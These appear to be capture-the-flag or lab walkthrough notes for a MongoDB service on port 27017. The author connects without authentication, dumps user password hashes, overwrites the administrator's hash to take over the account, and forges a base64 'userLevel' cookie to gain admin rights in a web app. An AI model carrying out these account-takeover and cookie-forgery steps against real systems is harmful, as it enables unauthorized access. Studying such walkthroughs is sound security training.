# 6 :27017 mongodb

```
# installing mongo-client
# add the gpg and keys
https://docs.mongodb.com/manual/tutorial/install-mongodb-on-debian/
sudo apt-get install -y mongodb-org-shell -> deprecated
sudo apt-get install -y mongodb-mongosh

$ mongo --version
MongoDB shell version v5.0.2
Build Info: {
    "version": "5.0.2",
    "gitVersion": "6d9ec525e78465dcecadcff99cce953d380fedc8",
    "openSSLVersion": "OpenSSL 1.1.1l  24 Aug 2021",
    "modules": [],
    "allocator": "tcmalloc",
    "environment": {
        "distmod": "debian10",
        "distarch": "x86_64",
        "target_arch": "x86_64"
    }
}

# using mongosh
$ mongosh --version
1.0.5

$ mongosh --host 192.168.213.110
Current Mongosh Log ID: 6136a65740a61129003a393f
Connecting to:          mongodb://192.168.213.110:27017/?directConnection=true
Using MongoDB:          4.2.9
Using Mongosh:          1.0.5

test> show dbs
account-app   147 kB
admin          41 kB
config        111 kB
local        73.7 kB
test> use account-app
switched to db account-app
account-app> show collections
logmsg
users
account-app> db.users.find()
[
  {
    _id: ObjectId("5f73c575eae85a15b8df908d"),
    username: 'administrator',
    password: 'ab6edb97f0c7a6455c57f94b7df73263e57113c85f38cd9b9470c8be8d6dd8ac',
    facebook: 'NEVER!',
    github: 'http://github.com/',
    name: 'administrator',
    twitter: 'https://twitter.com/sadserver'
  },
  {
    _id: ObjectId("61369b726eb51303c62b1199"),
    username: 'kashz',
    password: '0ce2e0e33b135c926d99769cbb8fa551e6f21db97837cf1af0b881f228d89319'
  }
]
account-app

# found admin hash
# cant crack it but can change it to kashz
account-app> db.users.update({'username': 'administrator'},{$set:{'password': '0ce2e0e33b135c926d99769cbb8fa551e6f21db97837cf1af0b881f228d89319'}}) # deprecated
account-app> db.users.updateOne({username: 'administrator'},{$set: {password: '0ce2e0e33b135c926d99769cbb8fa551e6f21db97837cf1af0b881f228d89319'}})
{
  acknowledged: true,
  insertedId: null,
  matchedCount: 1,
  modifiedCount: 1,
  upsertedCount: 0
}

# trying to login via administrator:kashz
http://192.168.213.110:3000/auth/login
# works, logged in

# only thing interesting is
- New Event Log
- See All Events

# adding new logs
# http://192.168.213.110:3000/logs
ERROR: only the admin can update the event logs

# looking at it in burp, cookie is interesting
Cookie: connect.sid=s%3AzA0Qs5TRDhm8s7QFmyCIAw3QKOWkddOl.bRFb%2B0Vut5eikwrxovq8E3FrDPAqfkhFU4Esn5NhHxU; userLevel=ZGVmYXVsdA%3D%3D

# userlevel > URL decode > base64 -d
ZGVmYXVsdA%3D%3D > ZGVmYXVsdA== > default

# modifying it to admin
admin > base64: YWRtaW4= > url-encode: YWRtaW4%3D
(green box) The event log has been updated
(red box) Message format not valid, try "using double quotes" (testing new feature)

# post shows up in /logs/all
```
